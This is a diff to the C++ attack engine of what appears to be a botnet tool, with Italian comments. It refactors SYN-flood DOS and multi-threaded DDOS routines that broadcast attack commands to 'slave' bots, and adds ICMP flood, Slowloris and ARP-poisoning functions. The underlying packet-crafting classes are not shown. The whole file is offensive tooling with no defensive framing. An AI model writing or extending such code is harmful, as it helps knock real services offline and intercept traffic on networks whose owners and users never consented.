@@ -4,41 +4,45 @@ AttackEngine::AttackEngine(BotnetManager *bm) : botnet(bm) {}
 
 void AttackEngine::executeDOS(const std::string &target, int port, bool use_raw) {
     Utils::animateAttack("DOS", target + ":" + std::to_string(port));
-    
     if (use_raw) {
         packet_crafter.sendSYNFlood(target, port, 1000);
     }
-    
-    // Se siamo master, invia automaticamente agli slave
     if (botnet && botnet->isMaster()) {
-        std::string cmd = "DOS " + target + " " + std::to_string(port);
-        botnet->broadcastToSlaves(cmd);
+        botnet->broadcastToSlaves("DOS " + target + " " + std::to_string(port));
     }
 }
 
 void AttackEngine::executeDDOS(const std::string &target, int port, int bots) {
-    Utils::animateAttack("DDOS", target + ":" + std::to_string(port) + " [Bots: " + std::to_string(bots) + "]");
-    
-    // Lancia attacchi multi-threaded
+    Utils::animateAttack("DDOS", target + ":" + std::to_string(port));
     std::vector<std::thread> threads;
     for (int i = 0; i < bots; i++) {
         threads.emplace_back([this, target, port]() {
             packet_crafter.sendSYNFlood(target, port, 100);
         });
     }
+    for (auto &t : threads) t.join();
     
-    for (auto &t : threads) {
-        if (t.joinable()) t.join();
-    }
-    
-    // Broadcast a slave se master
     if (botnet && botnet->isMaster()) {
-        std::string cmd = "DOS " + target + " " + std::to_string(port);
-        botnet->broadcastToSlaves(cmd);
+        botnet->broadcastToSlaves("DDOS " + target + " " + std::to_string(port));
     }
 }
 
+void AttackEngine::executeICMPFlood(const std::string &target, int packets) {
+    Utils::animateAttack("ICMP FLOOD", target);
+    icmp_flooder.flood(target, packets, 1000);
+}
+
+void AttackEngine::executeSlowloris(const std::string &target, int port, int connections) {
+    Utils::animateAttack("SLOWLORIS", target + ":" + std::to_string(port));
+    slowloris.attack(target, port, connections);
+}
+
+void AttackEngine::executeARPSpoof(const std::string &target, const std::string &gateway) {
+    Utils::animateAttack("ARP SPOOFING", target + " <-> " + gateway);
+    arp_spoofer.initialize("eth0"); // o rileva automaticamente
+    arp_spoofer.startPoisoning(target, gateway);
+}
+
 void AttackEngine::executeHunt() {
-    Utils::logWarning("Modalità HUNT attiva - Scansione e attacco automatico");
-    // Implementazione scanner + attacco automatico
+    Utils::logWarning("Modalità HUNT attiva");
 }
